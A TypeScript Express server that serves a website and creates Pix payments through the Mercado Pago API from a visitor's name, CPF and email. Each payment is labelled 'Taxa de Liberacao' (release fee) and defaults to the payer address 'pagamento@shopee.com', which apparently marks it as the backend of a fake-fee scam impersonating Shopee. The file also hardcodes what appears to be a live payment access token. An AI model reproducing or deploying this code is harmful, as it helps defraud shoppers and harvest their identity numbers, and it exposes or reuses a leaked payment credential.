import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';

const app = express();

// 1. Configurações
app.use(express.json());
app.use(cors({ origin: '*' }));

// 2. Rota de Teste (Para saber se o server subiu)
app.get('/status', (req, res) => {
    res.send('Servidor Online: Rota Pix Ativa');
});

// ========================================================
// 3. ROTA DA API PIX (PRIORIDADE ALTA)
// ========================================================
app.post('/pix', async (req, res) => {
    console.log("🔔 Pedido de Pix recebido:", req.body);

    try {
        const { amount, name, cpf, email } = req.body;
        
        // Dados para o Mercado Pago
        const payload = {
            transaction_amount: Number(amount) || 37.90,
            description: "Taxa de Liberacao",
            payment_method_id: "pix",
            payer: {
                email: (email && email.includes('@')) ? email : "pagamento@shopee.com",
                first_name: String(name).split(' ')[0] || "Cliente",
                last_name: String(name).split(' ').slice(1).join(' ') || "Sobrenome",
                identification: {
                    type: "CPF",
                    number: String(cpf).replace(/\D/g, '')
                }
            }
        };

        const ACCESS_TOKEN = 'APP_USR-2572776399339396-020516-e4fefa77579bb50393285e683713d789-232650059';

        const response = await axios.post('https://api.mercadopago.com/v1/payments', payload, {
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Content-Type': 'application/json',
                'X-Idempotency-Key': `pix-${Date.now()}`
            }
        });

        console.log("✅ Pix Gerado ID:", response.data.id);
        res.status(201).json(response.data);

    } catch (error: any) {
        console.error("❌ Erro MP:", error.response?.data || error.message);
        res.status(500).json({ 
            error: "Erro ao gerar Pix", 
            detalhes: error.response?.data 
        });
    }
});

// ========================================================
// 4. SERVIR O SITE (FRONTEND)
// ========================================================
// Serve os arquivos da pasta raiz (onde está o index.html)
app.use(express.static(path.join(__dirname, '../')));

// Qualquer outra rota entrega o index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// ========================================================
// 5. INICIALIZAÇÃO (CORREÇÃO DO ERRO)
// ========================================================
const PORT = Number(process.env.PORT) || 10000;

// O IP '0.0.0.0' libera o acesso externo na Render
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
});